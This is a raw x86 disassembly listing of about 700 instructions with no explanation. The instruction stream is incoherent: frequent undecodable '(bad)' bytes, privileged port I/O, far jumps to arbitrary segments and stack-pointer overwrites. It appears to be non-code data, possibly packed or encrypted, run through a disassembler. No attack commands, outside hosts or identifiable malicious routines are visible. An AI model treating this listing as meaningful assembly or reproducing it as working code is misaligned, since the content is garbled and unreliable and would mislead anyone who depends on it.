  41af35:	sbb    al,0x35
  41af37:	xbegin 0x883ba69e
  41af3d:	shr    BYTE PTR [edi+0x20],1
  41af40:	sub    ah,cl
  41af42:	shl    BYTE PTR [edi+0x4f],0x30
  41af46:	inc    ecx
  41af47:	cdq    
  41af48:	push   ds
  41af49:	xchg   ebx,eax
  41af4a:	mov    edx,0x416b49db
  41af4f:	aad    0x3f
  41af51:	stc    
  41af52:	fs call 0xa3112100
  41af58:	div    DWORD PTR [edx-0x64]
  41af5b:	shl    DWORD PTR [edi+0x6e7c01aa],cl
  41af61:	inc    edi
  41af62:	xchg   esp,eax
  41af63:	add    BYTE PTR [eax-0x38],bl
  41af66:	in     al,0x5f
  41af68:	mov    eax,ds:0xe32541ac
  41af6d:	pop    edx
  41af6e:	adc    ch,BYTE PTR [eax-0x49c9563d]
  41af74:	jp     0x41af3b
  41af76:	dec    ebp
  41af77:	mov    ds:0x7308ec8e,al
  41af7c:	dec    eax
  41af7d:	mov    ah,0x5
  41af7f:	xchg   esi,eax
  41af80:	sub    BYTE PTR [edx+esi*1+0xa],dh
  41af84:	clc    
  41af85:	(bad)  
  41af86:	std    
  41af87:	sub    BYTE PTR [eax+esi*1+0x27],bl
  41af8b:	add    DWORD PTR [edi+0x3f],0xf74c9a25
  41af92:	arpl   ax,si
  41af94:	sbb    dh,BYTE PTR [eax+0x75]
  41af97:	pusha  
  41af98:	lock mov cl,BYTE PTR [edi]
  41af9b:	fsub   QWORD PTR [esi+0x7d]
  41af9e:	adc    BYTE PTR es:[ecx+0x16],cl
  41afa2:	mov    bh,0x2d
  41afa4:	sub    esi,esi
  41afa6:	xchg   esi,eax
  41afa7:	ret    0x16f
  41afaa:	sub    eax,0x7d5399b1
  41afaf:	into   
  41afb0:	pandn  mm0,QWORD PTR ds:[eax]
  41afb4:	call   0x8f9aaad9
  41afb9:	ror    DWORD PTR [esi+0x7107b910],1
  41afbf:	pop    ecx
  41afc0:	shl    BYTE PTR [ecx+ebx*4+0x641df40b],0xf6
  41afc8:	in     eax,0x92
  41afca:	push   ds
  41afcb:	sub    BYTE PTR [eax],0xce
  41afce:	sar    DWORD PTR [esi+0x5b],1
  41afd1:	mov    esp,0x5a861e58
  41afd6:	sub    esp,DWORD PTR [esi+0x37]
  41afd9:	mov    gs,edi
  41afdb:	inc    ebx
  41afdc:	in     eax,0x11
  41afde:	call   0x8be5f4f3
  41afe3:	fs ret 0x34df
  41afe7:	mov    eax,ds:0x725ec869
  41afec:	adc    ecx,DWORD PTR [eax-0x53c4ee58]
  41aff2:	dec    esi
  41aff3:	call   0x9c8e:0x2276fc44
  41affa:	lock call 0x9df6:0x26852fbe
  41b002:	imul   ecx,DWORD PTR [edx-0x4fdeed56],0x1f
  41b009:	popa   
  41b00a:	mov    ds:0x1b8023c0,eax
  41b00f:	push   0xffffff8c
  41b011:	fdivr  QWORD PTR [eax+ebx*2-0x5f]
  41b015:	add    eax,DWORD PTR [esi*1+0x27769596]
  41b01c:	ret    0x45f5
  41b01f:	mov    al,ds:0xa473713d
  41b024:	and    ebp,DWORD PTR [ecx+esi*2-0xcadb963]
  41b02b:	shl    BYTE PTR [esi+0x7d],1
  41b02e:	loope  0x41b040
  41b030:	lea    edx,[eax]
  41b032:	dec    edx
  41b033:	call   esp
  41b035:	arpl   sp,cx
  41b037:	arpl   WORD PTR ds:[ebp-0x6e9245a],dx
  41b03e:	jno    0x41afe1
  41b040:	fwait
  41b041:	pop    ebp
  41b042:	gs pop esp
  41b044:	shl    BYTE PTR [ecx-0x64],cl
  41b047:	rol    ecx,cl
  41b049:	jg     0x41b096
  41b04b:	ins    BYTE PTR es:[edi],dx
  41b04c:	ret    
  41b04d:	sbb    BYTE PTR [ebx-0x2b],bh
  41b050:	out    0xba,al
  41b052:	or     dh,ch
  41b054:	clc    
  41b055:	inc    esp
  41b056:	ins    DWORD PTR es:[edi],dx
  41b057:	int3   
  41b058:	push   es
  41b059:	fwait
  41b05a:	xchg   esi,eax
  41b05b:	fisubr DWORD PTR [ebx]
  41b05d:	or     ebp,esp
  41b05f:	test   eax,0xb45e9613
  41b064:	in     eax,0xe5
  41b066:	sbb    DWORD PTR gs:[eax+0xde4bf0],ebp
  41b06d:	test   DWORD PTR [esp+esi*2+0x33],edx
  41b071:	loop   0x41b039
  41b073:	sbb    eax,0x31240149
  41b078:	mov    al,0x82
  41b07a:	mov    esi,0xf1e49428
  41b07f:	mov    dh,0x78
  41b081:	or     ch,ah
  41b083:	adc    al,0x4a
  41b085:	shl    al,0xca
  41b088:	sub    DWORD PTR [esp+edx*2],0x3
  41b08c:	je     0x41b073
  41b08e:	adc    ebp,esp
  41b090:	push   cs
  41b091:	idiv   DWORD PTR [ebx-0x3bb4145]
  41b097:	sub    esp,DWORD PTR [edi-0x695787c]
  41b09d:	out    0x4e,al
  41b09f:	sbb    al,0x7f
  41b0a1:	adc    al,0xe3
  41b0a3:	(bad)  
  41b0a5:	fwait
  41b0a6:	mov    bh,0xa
  41b0a8:	cmp    ch,bh
  41b0aa:	or     eax,0x47578cb1
  41b0af:	pop    ss
  41b0b0:	push   cs
  41b0b1:	sub    DWORD PTR [esp+esi*4],edi
  41b0b4:	mov    ecx,0xee074875
  41b0b9:	jmp    0xccb43053
  41b0be:	stos   BYTE PTR es:[edi],al
  41b0bf:	outs   dx,BYTE PTR ds:[esi]
  41b0c0:	cmp    al,0xdb
  41b0c2:	jbe    0x41b074
  41b0c4:	add    bl,BYTE PTR [edi+0x14]
  41b0c7:	retf   0x45b
  41b0ca:	sbb    BYTE PTR [edx],cl
  41b0cc:	lea    ecx,[edx-0x391286a9]
  41b0d2:	ds (bad) 
  41b0d4:	xor    eax,0x2b2fc6a9
  41b0d9:	pop    es
  41b0da:	push   esp
  41b0db:	es hlt 
  41b0dd:	test   BYTE PTR [ecx-0x6d],dl
  41b0e0:	fbstp  TBYTE PTR [ecx]
  41b0e2:	(bad)  
  41b0e3:	mov    dl,BYTE PTR [edi+0x6a055ced]
  41b0e9:	push   0xffffffb2
  41b0eb:	pop    esi
  41b0ec:	popf   
  41b0ed:	pushf  
  41b0ee:	gs mov al,0x17
  41b0f1:	imul   esp,DWORD PTR [edi+ebx*4+0x3f],0xffffff96
  41b0f6:	in     al,0xe
  41b0f8:	imul   eax,DWORD PTR [esi-0x6fce1818],0x5394fdab
  41b102:	jl     0x41b096
  41b104:	xor    BYTE PTR fs:[ebx],dh
  41b107:	nop
  41b108:	fdiv   QWORD PTR [edx-0x63ccc11d]
  41b10e:	push   cs
  41b10f:	mov    cs,edx
  41b111:	sub    eax,0x2da1b2f6
  41b116:	inc    esp
  41b117:	pop    eax
  41b118:	jp     0x41b0e9
  41b11a:	das    
  41b11b:	imul   ebx,DWORD PTR [ebx+0x68],0x75
  41b11f:	popf   
  41b120:	push   ebx
  41b121:	out    dx,al
  41b122:	mov    ebp,DWORD PTR [ebx+edi*8-0x2e]
  41b126:	cmp    al,BYTE PTR [edx-0x44054983]
  41b12c:	mov    dh,0x67
  41b12e:	pop    esp
  41b12f:	scas   al,BYTE PTR es:[edi]
  41b130:	ror    esp,0x6e
  41b133:	or     bl,ch
  41b135:	mov    ebp,?
  41b137:	mov    bh,0xaa
  41b139:	es int 0x3f
  41b13c:	fst    st(3)
  41b13e:	adc    bh,dl
  41b140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b141:	in     al,0x35
  41b143:	fldenv [ecx-0x4e0563a]
  41b149:	mov    eax,ds:0x912f292f
  41b14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b14f:	add    eax,0x28abb912
  41b154:	cmc    
  41b155:	nop
  41b156:	jle    0x41b0f6
  41b158:	fwait
  41b159:	int    0x8c
  41b15b:	mov    al,ds:0xc076f2b5
  41b160:	int3   
  41b161:	outs   dx,DWORD PTR ds:[esi]
  41b162:	and    DWORD PTR [edi-0x7746f2a3],esi
  41b168:	dec    ebp
  41b169:	inc    ebp
  41b16a:	jne    0x41b124
  41b16c:	data16 (bad) 
  41b16e:	mov    DWORD PTR [eax-0x7b],esp
  41b171:	ds stos BYTE PTR es:[edi],al
  41b173:	mov    ecx,edx
  41b175:	add    al,BYTE PTR [edi]
  41b177:	shl    DWORD PTR [esi+eiz*4],cl
  41b17a:	adc    dl,BYTE PTR [edi+0x2c1c3189]
  41b180:	es jecxz 0x41b150
  41b183:	(bad)  
  41b184:	ror    BYTE PTR [ecx+0x50],1
  41b187:	sar    DWORD PTR [edx+0x27],1
  41b18a:	push   edi
  41b18b:	and    eax,ecx
  41b18d:	add    al,bh
  41b18f:	push   0x27
  41b191:	jb     0x41b166
  41b193:	shl    DWORD PTR [edi],1
  41b195:	and    bl,BYTE PTR [esi-0x78]
  41b198:	out    0x81,eax
  41b19a:	pop    ss
  41b19b:	daa    
  41b19c:	aad    0x58
  41b19e:	cld    
  41b19f:	scas   eax,DWORD PTR es:[edi]
  41b1a0:	mov    WORD PTR [ebx],es
  41b1a2:	(bad)  
  41b1a3:	ss cwde 
  41b1a5:	jge    0x41b21e
  41b1a7:	and    BYTE PTR [edi],ah
  41b1a9:	push   esi
  41b1aa:	cmp    al,0x3
  41b1ac:	sahf   
  41b1ad:	rcl    ecx,cl
  41b1af:	or     al,0x94
  41b1b1:	cvtps2pi mm3,QWORD PTR [ebx]
  41b1b4:	mov    ah,0xd2
  41b1b6:	in     al,0xbb
  41b1b8:	jb     0x41b20f
  41b1ba:	cmovae edi,DWORD PTR [eax-0xa]
  41b1be:	lods   al,BYTE PTR ds:[esi]
  41b1bf:	sbb    dl,0xe9
  41b1c2:	cdq    
  41b1c3:	mov    eax,0x207a2067
  41b1c8:	aas    
  41b1c9:	jo     0x41b204
  41b1cb:	xor    al,0xf9
  41b1cd:	or     bl,BYTE PTR [ebx-0x67]
  41b1d0:	xchg   edi,eax
  41b1d1:	iret   
  41b1d2:	pop    ebp
  41b1d3:	and    BYTE PTR [ecx-0x6e5b6c83],ch
  41b1d9:	vpunpckhbw ymm3,ymm5,YMMWORD PTR [ebx]
  41b1de:	mov    ds:0xe827940a,eax
  41b1e3:	mov    ecx,0x2f62d402
  41b1e8:	mov    cl,0x1f
  41b1ea:	scas   al,BYTE PTR es:[edi]
  41b1eb:	test   BYTE PTR [edi-0x1480333e],dl
  41b1f1:	ss (bad) 
  41b1f4:	es xor al,0x17
  41b1f7:	bound  edi,QWORD PTR [eax]
  41b1f9:	pop    ecx
  41b1fa:	add    eax,0xb3e2f690
  41b1ff:	push   ds
  41b200:	fimul  DWORD PTR [ebx+0x28]
  41b203:	or     dh,BYTE PTR [edi+0x1e]
  41b206:	add    cl,dl
  41b208:	out    dx,al
  41b209:	or     al,bl
  41b20b:	mov    ecx,DWORD PTR ds:0x488ee181
  41b211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b212:	sbb    ch,al
  41b214:	xor    BYTE PTR [ebx+eiz*2+0x3e],al
  41b218:	lea    edx,[edx-0x62]
  41b21b:	imul   ebp,DWORD PTR es:[ebp-0x29],0x44
  41b220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b221:	jg     0x41b279
  41b223:	push   0x77
  41b225:	push   esp
  41b226:	pusha  
  41b227:	sbb    esp,esp
  41b229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b22a:	loop   0x41b1ed
  41b22c:	lods   al,BYTE PTR ds:[esi]
  41b22d:	mov    al,0x7f
  41b22f:	pop    edi
  41b230:	(bad)  
  41b231:	imul   ebx,esp,0xffffffe8
  41b234:	test   al,0x25
  41b236:	dec    esp
  41b237:	out    dx,al
  41b238:	das    
  41b239:	imul   ebx,DWORD PTR [edi+0x23],0x1
  41b23d:	pop    esp
  41b23e:	cmp    al,0x38
  41b240:	cli    
  41b241:	cli    
  41b242:	xchg   ebx,eax
  41b243:	(bad)  
  41b244:	mov    eax,ds:0xd925659a
  41b249:	cli    
  41b24a:	sub    BYTE PTR [ebp+ecx*1+0x414a4b3b],0xbc
  41b252:	add    ah,al
  41b254:	daa    
  41b255:	(bad)  
  41b256:	out    0xea,al
  41b258:	(bad)  
  41b259:	js     0x41b2ab
  41b25b:	jg     0x41b1ff
  41b25d:	gs jmp 0x41b248
  41b260:	and    cl,BYTE PTR [ebx-0x2476172c]
  41b266:	jg     0x41b20c
  41b268:	and    al,0x41
  41b26a:	es mov bh,0x91
  41b26d:	mov    dl,0x2e
  41b26f:	dec    ebx
  41b270:	xchg   esi,eax
  41b271:	addr16 stc 
  41b273:	in     eax,0x8
  41b275:	add    eax,0x356038c1
  41b27a:	mov    WORD PTR [esi+edi*8-0x2765263b],ss
  41b281:	xchg   ebx,eax
  41b282:	dec    edi
  41b283:	dec    esp
  41b284:	aam    0xa1
  41b286:	jae    0x41b247
  41b288:	inc    esp
  41b289:	sti    
  41b28a:	pop    esi
  41b28b:	ret    0xd416
  41b28e:	and    al,0x5e
  41b290:	(bad)  
  41b291:	jmp    0x41b2c3
  41b293:	fisub  WORD PTR [ebp+0x65e54d91]
  41b299:	jnp    0x41b29d
  41b29b:	gs in  al,0x78
  41b29e:	and    al,BYTE PTR [ebp-0x23da5298]
  41b2a4:	jecxz  0x41b2b0
  41b2a6:	jmp    0x41b26a
  41b2a8:	cli    
  41b2a9:	repz mov bl,0xdd
  41b2ac:	add    eax,ecx
  41b2ae:	dec    edi
  41b2af:	inc    ebp
  41b2b0:	xchg   ebx,eax
  41b2b1:	mov    cs,WORD PTR [esi+ebp*2]
  41b2b4:	mul    BYTE PTR [ebx+0x5d]
  41b2b7:	gs cmp al,0x2a
  41b2ba:	in     eax,dx
  41b2bb:	mov    edi,ebx
  41b2bd:	cmp    esi,DWORD PTR [ebp-0x8f5d968]
  41b2c3:	popa   
  41b2c4:	mov    esi,0x77ed12e5
  41b2c9:	mov    ah,0xdb
  41b2cb:	dec    eax
  41b2cc:	pop    eax
  41b2cd:	inc    ebp
  41b2ce:	xchg   ebx,eax
  41b2cf:	mov    ebp,0x209e423d
  41b2d4:	icebp  
  41b2d5:	pusha  
  41b2d6:	ret    
  41b2d7:	add    DWORD PTR [edi],esi
  41b2d9:	pop    ebp
  41b2da:	dec    ebp
  41b2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2dd:	stos   DWORD PTR es:[edi],eax
  41b2de:	js     0x41b32a
  41b2e0:	dec    edi
  41b2e1:	inc    BYTE PTR [edi]
  41b2e3:	push   ds
  41b2e4:	dec    ebx
  41b2e5:	test   al,0x37
  41b2e7:	cmp    esi,ebp
  41b2e9:	dec    ebx
  41b2ea:	inc    edi
  41b2eb:	push   edi
  41b2ec:	cmc    
  41b2ed:	js     0x41b2ca
  41b2ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2f0:	xor    al,0xf
  41b2f2:	retf   0x7257
  41b2f5:	xchg   ebx,eax
  41b2f6:	ret    0xa1c9
  41b2f9:	mov    BYTE PTR [eax-0x75],al
  41b2fc:	inc    ecx
  41b2fd:	ret    0xf799
  41b300:	jp     0x41b300
  41b302:	cmp    DWORD PTR [ebx-0x500d9590],ecx
  41b308:	dec    ebp
  41b309:	not    BYTE PTR [edi-0x408dd767]
  41b30f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b310:	jb     0x41b2f3
  41b312:	jmpw   0x5b40
  41b316:	and    al,0x48
  41b318:	stos   BYTE PTR es:[edi],al
  41b319:	mov    edi,0x7597d285
  41b31e:	inc    ecx
  41b31f:	mov    esp,0x900507e5
  41b324:	mov    al,ds:0xc12c935f
  41b329:	sbb    al,0xe2
  41b32b:	xor    BYTE PTR [ecx],al
  41b32d:	pop    ds
  41b32e:	test   DWORD PTR [edx-0x6],esi
  41b331:	and    dl,BYTE PTR [eax+0x30]
  41b334:	jne    0x41b3a7
  41b336:	and    esi,DWORD PTR [edi-0x60]
  41b339:	jae    0x41b328
  41b33b:	mov    eax,ds:0x35818d7a
  41b340:	ins    DWORD PTR es:[edi],dx
  41b341:	fistp  QWORD PTR [esi-0x2b]
  41b344:	sahf   
  41b345:	call   0x9cf8c473
  41b34a:	adc    eax,0x5b89ed89
  41b34f:	fs lahf 
  41b351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b352:	sub    DWORD PTR [eax+0x36a53bbe],edx
  41b358:	addr16 cwde 
  41b35a:	lods   al,BYTE PTR ds:[esi]
  41b35b:	cdq    
  41b35c:	aas    
  41b35d:	xchg   edi,eax
  41b35e:	lea    eax,[ecx-0x60235160]
  41b364:	sbb    ecx,ecx
  41b366:	hlt    
  41b367:	ficomp WORD PTR [ebp+0x2a372001]
  41b36d:	(bad)  
  41b36e:	shl    DWORD PTR [edx+0x2750d8c7],cl
  41b374:	xchg   ebp,eax
  41b375:	xchg   ecx,eax
  41b376:	test   eax,0xae9e869a
  41b37b:	jb     0x41b399
  41b37d:	pop    ebp
  41b37e:	out    dx,eax
  41b37f:	jb     0x41b400
  41b381:	push   edx
  41b382:	mov    DWORD PTR [eax-0x4c7fb619],esp
  41b388:	mov    bh,0x59
  41b38a:	in     al,0xec
  41b38c:	aaa    
  41b38d:	push   cs
  41b38e:	in     al,0xe2
  41b390:	mov    ds:0x52e0c216,eax
  41b395:	shr    DWORD PTR [esi-0x69],0xaa
  41b399:	mov    ebp,0xd42fe4ca
  41b39e:	clc    
  41b39f:	mov    dh,0x5b
  41b3a1:	imul   eax,DWORD PTR [esp+ecx*8+0x440f5054],0xffffffef
  41b3a9:	pop    eax
  41b3aa:	inc    ecx
  41b3ab:	sub    ch,BYTE PTR ds:0x8632a0c1
  41b3b1:	retf   
  41b3b2:	outs   dx,BYTE PTR ds:[esi]
  41b3b3:	jne    0x41b3fd
  41b3b5:	stos   BYTE PTR es:[edi],al
  41b3b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3b7:	lods   al,BYTE PTR ds:[esi]
  41b3b8:	lods   eax,DWORD PTR ds:[esi]
  41b3b9:	pop    ebx
  41b3ba:	push   ebp
  41b3bb:	cmovne ecx,DWORD PTR [ebp+eiz*4-0xba0b695]
  41b3c3:	xor    cl,bh
  41b3c5:	jecxz  0x41b34b
  41b3c7:	push   esp
  41b3c8:	(bad)  
  41b3ca:	xlat   BYTE PTR ds:[ebx]
  41b3cb:	ret    
  41b3cc:	mov    edi,0xc5d730df
  41b3d1:	gs xchg edi,eax
  41b3d3:	push   0x4c3e1e2f
  41b3d8:	lahf   
  41b3d9:	aad    0x5a
  41b3db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3dc:	adc    ah,bl
  41b3de:	(bad)  
  41b3e0:	ss and eax,0x18d59246
  41b3e6:	mov    bh,0x2d
  41b3e8:	push   ebp
  41b3e9:	mov    esi,0x2f2d5d96
  41b3ee:	push   0x6fdc6810
  41b3f3:	mov    eax,ds:0x59a91ce7
  41b3f8:	xchg   edx,eax
  41b3f9:	mov    bl,BYTE PTR [ebx]
  41b3fb:	pop    esp
  41b3fc:	xchg   ebp,eax
  41b3fd:	sub    bh,BYTE PTR [esi+0x4e55ae5a]
  41b403:	jmp    0xd4bd21e9
  41b408:	xor    eax,0x35ba8cf1
  41b40d:	mov    esp,0xdee271c7
  41b412:	jecxz  0x41b457
  41b414:	(bad)  
  41b415:	lds    edi,FWORD PTR [esi]
  41b417:	xor    DWORD PTR [esi+0x78],0xffffff87
  41b41b:	mov    esi,0x9ee06c16
  41b420:	in     eax,dx
  41b421:	jg     0x41b422
  41b423:	aaa    
  41b424:	in     al,dx
  41b425:	mov    ds:0x70dd2f8c,eax
  41b42a:	stos   DWORD PTR es:[edi],eax
  41b42b:	test   eax,0x85cd4105
  41b430:	aaa    
  41b431:	inc    esi
  41b432:	push   ecx
  41b433:	pop    esp
  41b434:	mov    WORD PTR [edx+0x4da26a80],es
  41b43a:	lods   eax,DWORD PTR ds:[esi]
  41b43b:	inc    edi
  41b43c:	loop   0x41b439
  41b43e:	sbb    esp,DWORD PTR [edi+0x7b698dfd]
  41b444:	dec    edx
  41b445:	lods   eax,DWORD PTR ds:[esi]
  41b446:	lahf   
  41b447:	clc    
  41b448:	dec    edi
  41b449:	cmp    BYTE PTR [esi],ah
  41b44b:	fnstenv [ecx+0x7]
  41b44e:	fs js  0x41b41d
  41b451:	lods   eax,DWORD PTR ds:[esi]
  41b452:	rol    DWORD PTR [eax+0x7cae77ea],1
  41b458:	mov    eax,DWORD PTR [eax]
  41b45a:	mov    dl,BYTE PTR [edx]
  41b45c:	fisub  WORD PTR [ebp-0x55]
  41b45f:	gs add al,0x28
  41b462:	jmp    0xa7ec4225
  41b467:	(bad)  
  41b468:	(bad)  
  41b469:	and    DWORD PTR gs:[edx+0x17],ebx
  41b46d:	pop    ss
  41b46e:	xchg   DWORD PTR [eax],ebp
  41b470:	inc    esp
  41b471:	adc    al,0x11
  41b473:	cmc    
  41b474:	mov    ss,WORD PTR [edi]
  41b476:	pop    edx
  41b477:	test   BYTE PTR [ebx],bh
  41b479:	pop    ecx
  41b47a:	ss pop edx
  41b47c:	xchg   BYTE PTR [eax],dh
  41b47e:	inc    ebx
  41b47f:	or     ebp,DWORD PTR [edi+0x3c]
  41b482:	jnp    0x41b46a
  41b484:	mov    eax,0xc2290432
  41b489:	sar    BYTE PTR [eax],0xe4
  41b48c:	pop    ds
  41b48d:	or     DWORD PTR [esi+0x50],esp
  41b490:	test   BYTE PTR [eax+0x4f259511],dh
  41b496:	sub    eax,0x21ace1c4
  41b49b:	or     al,0x81
  41b49d:	push   edi
  41b49e:	or     ah,BYTE PTR [ebp-0x46]
  41b4a1:	iret   
  41b4a2:	aad    0x67
  41b4a4:	inc    ebp
  41b4a5:	jecxz  0x41b4e5
  41b4a7:	push   eax
  41b4a8:	jnp    0x41b479
  41b4aa:	push   ebx
  41b4ab:	cmp    eax,DWORD PTR [edx]
  41b4ad:	mov    ebx,0x5fd16292
  41b4b2:	into   
  41b4b3:	retf   0x4c5b
  41b4b6:	xchg   ebx,eax
  41b4b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4b8:	push   ecx
  41b4b9:	imul   ebp,DWORD PTR [edx-0x64],0xabdf9723
  41b4c0:	out    dx,al
  41b4c1:	in     al,dx
  41b4c2:	jae    0x41b4a7
  41b4c4:	(bad)  
  41b4c6:	push   0x59
  41b4c8:	mov    ds:0x8ca6617a,al
  41b4cd:	dec    edx
  41b4ce:	sbb    BYTE PTR [esi+eiz*1],0x8c
  41b4d2:	mov    BYTE PTR [eax],dh
  41b4d4:	xchg   esp,eax
  41b4d5:	ds icebp 
  41b4d7:	or     al,0xb1
  41b4d9:	sub    dl,BYTE PTR [edi-0x57f72eb5]
  41b4df:	inc    ebx
  41b4e0:	mov    edi,0x1d89f32b
  41b4e5:	push   0x4c
  41b4e7:	sub    DWORD PTR [esi-0x7d728f51],edx
  41b4ed:	inc    edi
  41b4ee:	dec    esp
  41b4ef:	popf   
  41b4f0:	or     BYTE PTR [edx-0x39],cl
  41b4f3:	ret    0x4cfb
  41b4f6:	inc    eax
  41b4f7:	and    DWORD PTR [ebx-0x65],0x56
  41b4fb:	jnp    0x41b545
  41b4fd:	in     al,0xf7
  41b4ff:	in     eax,dx
  41b500:	cld    
  41b501:	inc    edx
  41b502:	dec    edx
  41b503:	pop    eax
  41b504:	ret    
  41b505:	dec    ebx
  41b506:	pop    es
  41b507:	repnz sub al,BYTE PTR ss:[edi+0x17a83ec9]
  41b50f:	mov    edx,0xe7f48b00
  41b514:	rcl    DWORD PTR [edi+0x52],1
  41b517:	neg    BYTE PTR [edx]
  41b519:	fcmovnb st,st(2)
  41b51b:	aaa    
  41b51c:	xchg   edi,eax
  41b51d:	pop    ebp
  41b51e:	aam    0xde
  41b520:	sub    eax,0xbc0c9897
  41b525:	pop    edx
  41b526:	(bad)  
  41b527:	sar    edi,cl
  41b529:	xor    eax,0xf7af5416
  41b52e:	imul   ecx,ebx,0xffffff87
  41b531:	cmp    DWORD PTR [ebx-0x26],ecx
  41b534:	or     DWORD PTR [ebx],esi
  41b536:	xor    esi,edx
  41b538:	stc    
  41b539:	jl     0x41b541
  41b53b:	loop   0x41b564
  41b53d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b53e:	fbstp  TBYTE PTR [ebx]
  41b540:	xchg   WORD PTR gs:[edi+0x38],sp
  41b545:	or     al,BYTE PTR [eax+0x57]
  41b548:	adc    eax,edi
  41b54a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b54b:	pop    ss
  41b54c:	cmp    DWORD PTR [eax+edi*4+0x15],ecx
  41b550:	sbb    esp,ecx
  41b552:	popa   
  41b553:	mov    eax,ds:0xee7b3f16
  41b558:	iret   
  41b559:	dec    edx
  41b55a:	out    dx,eax
  41b55b:	mov    al,ds:0x1e7e887b
  41b560:	les    edx,FWORD PTR [ebx+0x58]
  41b563:	test   al,0xcd
  41b565:	hlt    
  41b566:	rcr    ebp,0xc7
  41b569:	aaa    
  41b56a:	lahf   
  41b56b:	js     0x41b586
  41b56d:	cmp    eax,DWORD PTR [eax-0x7efe06f2]
  41b573:	adc    eax,0x18bb87be
  41b578:	push   eax
  41b579:	imul   esp
  41b57b:	inc    edi
  41b57c:	dec    edi
  41b57d:	mov    edi,0x9d9285cd
  41b582:	jp     0x41b57e
  41b584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b585:	dec    esi
  41b586:	test   DWORD PTR ds:0x97b21ee2,ebp
  41b58c:	arpl   WORD PTR [esi],bx
  41b58e:	ins    BYTE PTR es:[edi],dx
  41b58f:	mov    ds:0xbe87493f,al
  41b594:	or     cl,BYTE PTR [ecx]
  41b596:	sub    al,0x30
  41b598:	push   ss
  41b599:	cs pop eax
  41b59b:	jmp    0x5ce3:0xadd1c311
  41b5a2:	mov    DWORD PTR [edx],esp
  41b5a4:	mov    ebx,0xed74d37e
  41b5a9:	in     al,dx
  41b5aa:	and    BYTE PTR [edi+edx*4-0x58],ch
  41b5ae:	and    ecx,DWORD PTR [esi+edi*1+0x6f]
  41b5b2:	leave  
  41b5b3:	fwait
  41b5b4:	and    BYTE PTR [esi],0x6f
  41b5b7:	and    BYTE PTR [edi],bh
  41b5b9:	jecxz  0x41b62a
  41b5bb:	sbb    al,0x99
  41b5bd:	cmp    eax,0x969e88d1
  41b5c2:	cmc    
  41b5c3:	addr16 es into 
  41b5c6:	dec    esi
  41b5c7:	fs mov bh,0x38
  41b5cb:	pop    esi
  41b5cc:	call   0x8f025fa2
  41b5d1:	int3   
  41b5d2:	jbe    0x41b627
  41b5d4:	(bad)  
  41b5d5:	mov    bl,0xb9
  41b5d7:	in     al,0xc3
  41b5d9:	jbe    0x41b60b
  41b5db:	pop    ds
  41b5dc:	lods   eax,DWORD PTR ds:[esi]
  41b5dd:	and    esp,ebp
  41b5df:	mov    ebx,0x43f4a899
  41b5e4:	sbb    DWORD PTR [eax],0x79
  41b5e7:	and    BYTE PTR [eax-0x56f02e],dl
  41b5ed:	pop    ebx
  41b5ee:	aad    0x73
  41b5f0:	mov    bh,0xb7
  41b5f2:	push   esi
  41b5f3:	das    
  41b5f4:	mov    BYTE PTR [ebx+0x1525cff0],dl
  41b5fa:	sub    edi,DWORD PTR [eax+0x2a]
  41b5fd:	inc    edx
  41b5fe:	xor    DWORD PTR [ebp-0x61],esp
  41b601:	jmp    0x8fec:0x1ea705ae
  41b608:	mov    eax,0x79e1a953
  41b60d:	aaa    
  41b60e:	adc    ebp,DWORD PTR [eax-0x66]
  41b611:	mov    cl,BYTE PTR [ebx]
  41b613:	pop    ss
  41b614:	push   0x56
  41b616:	fdiv   QWORD PTR [eax]
  41b618:	jmp    0xb897:0x84084235
  41b61f:	sub    BYTE PTR [ecx-0x4ff11266],dl
  41b625:	mov    edx,ebp
  41b627:	dec    edx
  41b628:	pushf  
  41b629:	fbld   TBYTE PTR [esi+0x2d]
  41b62c:	js     0x41b653
  41b62e:	and    ebp,DWORD PTR [edx+0x15]
  41b631:	lea    edx,[ecx+edi*2]
  41b634:	add    dl,BYTE PTR [esi-0x10]
  41b637:	mov    esi,0x463268f3
  41b63c:	ret    0xfe69
  41b63f:	mov    ch,0xcd
  41b641:	dec    ecx
  41b642:	xor    DWORD PTR [eax+0x1f],edx
  41b645:	js     0x41b6b4
  41b647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b648:	xchg   ecx,eax
  41b649:	jnp    0x41b6af
  41b64b:	sub    ebx,DWORD PTR [edx+edi*1]
  41b64e:	imul   edi,eax,0x77
  41b651:	cmp    bh,ch
  41b653:	fwait
  41b654:	xor    cl,BYTE PTR [ebp+0x57]
  41b657:	jo     0x41b638
  41b659:	push   edi
  41b65a:	ins    DWORD PTR es:[edi],dx
  41b65b:	xchg   esp,eax
  41b65c:	daa    
  41b65d:	aaa    
  41b65e:	aas    
  41b65f:	shl    DWORD PTR [edx+0x77],1
  41b662:	mov    eax,ds:0xdd056ce6
  41b667:	ja     0x41b620
  41b669:	outs   dx,DWORD PTR ds:[esi]
  41b66a:	push   0x76
  41b66c:	mov    cs,WORD PTR [edi]
  41b66e:	pop    eax
  41b66f:	imul   BYTE PTR [ebx+0x10]
  41b672:	push   0x1c
  41b674:	pop    es
  41b675:	and    eax,0x170eab10
  41b67a:	stc    
  41b67b:	js     0x41b6f9
  41b67d:	mov    ebp,0x29683a3
  41b682:	ss js  0x41b683
  41b685:	loop   0x41b64b
  41b687:	jg     0x41b6e7
  41b689:	inc    esp
  41b68a:	xchg   edi,eax
  41b68b:	loopne 0x41b638
  41b68d:	lahf   
  41b68e:	(bad)  
  41b68f:	mov    ebx,0x77ce9454
